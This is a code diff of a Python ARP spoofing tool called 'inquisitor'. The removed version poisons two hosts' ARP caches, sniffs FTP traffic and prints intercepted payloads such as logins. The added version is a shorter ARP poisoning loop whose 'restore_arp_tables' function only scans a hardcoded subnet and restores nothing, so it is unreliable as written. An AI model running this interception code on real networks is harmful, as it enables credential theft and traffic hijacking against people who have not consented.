@@ -1,112 +1,56 @@
 #!/usr/bin/env python3
 
-import argparse, os, sys, signal, pcapy, threading, socket
-import scapy.all as scapy
-from getmac import get_mac_address
+
+import sys, socket, argparse
+from scapy.all import ARP, Ether, srp, sniff, sendp, conf
 
 
-def ft_is_forward_activated():
-    with open("/proc/sys/net/ipv4/ip_forward", "rt") as file:
-        readed = file.read()
-        if "1\n" == readed:
-            return True
-    return False
+def restore_arp_tables(interface):
+    arp_request = ARP(pdst="192.168.1.0/24")
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    
+    answered_list, unanswered_list = srp(arp_request_broadcast, timeout=3, verbose=False, iface=interface)
+    
+    clients_list = []
+    for element in answered_list:
+        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+        clients_list.append(client_dict)
+        print(f"IP Address: {element[1].psrc}, MAC Address: {element[1].hwsrc}")
 
 
-class Spoofer(threading.Thread):
-    class SpooferRefresh(threading.Thread):
-        def __init__(self, event, ip_src, mac_src, ip_dst, mac_dst, mac_origin) -> None:
-            super().__init__()
-            self.event = event
-            self.ip_src = ip_src
-            self.mac_src = mac_src
-            self.ip_dst = ip_dst
-            self.mac_dst = mac_dst
-            self.hostname = socket.gethostname()
-            self.ip_address = socket.gethostbyname(self.hostname)
-            self.mac = mac_origin
+def arp_poison(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
+    def poison_packet(pkt):
+        if pkt[Ether].src == src_mac and pkt[Ether].dst == target_mac:
+            newpkt = Ether(dst=target_mac, src=src_mac) / ARP(op=2, pdst=target_ip, psrc=src_ip)
+            sendp(newpkt, iface=interface)
+        elif pkt[Ether].src == target_mac and pkt[Ether].dst == src_mac:
+            newpkt = Ether(dst=src_mac, src=target_mac) / ARP(op=2, pdst=src_ip, psrc=target_ip)
+            sendp(newpkt, iface=interface)
 
-        def run(self):
-            seconds_to_spoof = 10
-            while not self.event.is_set():
-                print("ARP spoofing", flush=True)
-                Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_dst, self.mac_dst)
-                Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src, self.mac_src)
-                self.event.wait(seconds_to_spoof)
-
-            Spoofer.SpooferRefresh.ft_restore(self.ip_dst, self.mac_dst, self.ip_src, self.mac_src)
-            Spoofer.SpooferRefresh.ft_restore(self.ip_src, self.mac_src, self.ip_dst, self.mac_dst)
-
-        @staticmethod
-        def ft_spoof(ip_origin, ip_dest, mac_dest):
-            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin)), verbose=0)
-            scapy.send(scapy.ARP(op=2, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin), verbose=0)
-
-        @staticmethod
-        def ft_restore(ip_origin, mac_origin, ip_dest, mac_dest):
-            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin)), verbose=0)
-            scapy.send(scapy.ARP(op=2, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin, hwsrc=mac_origin), verbose=0)
-
-
-    def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
-        super().__init__()
-        self.event = threading.Event()
-        self.mac = get_mac_address()
-        self.ip_src = ip_src
-        self.mac_src = mac_src
-        self.ip_dst = ip_dst
-        self.mac_dst = mac_dst
-        self.spoofer_refresher = Spoofer.SpooferRefresh(self.event, self.ip_src, self.mac_src, self.ip_dst, self.mac_dst, self.mac)
-        self.forwarding = ft_is_forward_activated()
-        self.pcap_listener = None
-        signal.signal(signal.SIGINT, self.catch)
-        signal.signal(signal.SIGTERM, self.catch)
-        signal.siginterrupt(signal.SIGINT, True)
-
-    def catch(self, signum, frame):
-        print("\r", end="", flush=True)
-        print("Free the arp tables", flush=True)
-        self.event.set()
-        self.spoofer_refresher.join()
-        self.pcap_listener.close()
-        os._exit(0)
-
-    def run(self):
-        self.spoofer_refresher.start()
-        self.pcap_listener = pcapy.open_live("eth0", 2000, True, 1000)
-        self.pcap_listener.setfilter("port 21")
-        while True:
-            next_packet = self.pcap_listener.next()
-            self.ft_process_packet(scapy.Ether(next_packet[1]))
-
-    def ft_process_packet(self, packet):
-        if scapy.Raw in packet:
-            if packet[scapy.Ether].src!= self.mac:
-                info = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
-                print("Message captured", flush=True)
-                print(info, flush=True)
-                if not self.forwarding:
-                    packet.src = self.mac
-                    if packet[scapy.Ether].src == self.mac_src:
-                        packet.dst = self.mac_dst
-                    else:
-                        packet.dst = self.mac_src
-                    scapy.sendp(packet, verbose=0)
-            else:
-                print("Message forwarded\n", flush=True)
+    try:
+        print(f"ARP Poisoning started. Press CTRL+C to stop.")
+        sniff(iface=interface, prn=lambda x: poison_packet(x))
+    except KeyboardInterrupt:
+        restore_arp_tables(interface)
+        print("ARP Poisoning stopped.")
 
 
 def ft_parser_args():
-    parser = argparse.ArgumentParser(description='ARP spoofer,./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
+    parser = argparse.ArgumentParser(description='ARP poisoning,./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
     parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")
     return parser.parse_args()
 
 
 def main():
     args = ft_parser_args()
-    spoofer = Spoofer(args.addresses[0], args.addresses[1], args.addresses[2], args.addresses[3])
-    spoofer.start()
-    spoofer.join()
+    try:
+        ip_src, mac_src, ip_target, mac_target = args.addresses
+        arp_poison(ip_src, mac_src, ip_target, mac_target)
+    except ValueError:
+        print("Invalid IP address format. Please use IPv4 addresses.")
+    except Exception as e:
+        print(f"An unexpected error occurred: {e}")
 
 
 if __name__ == "__main__":
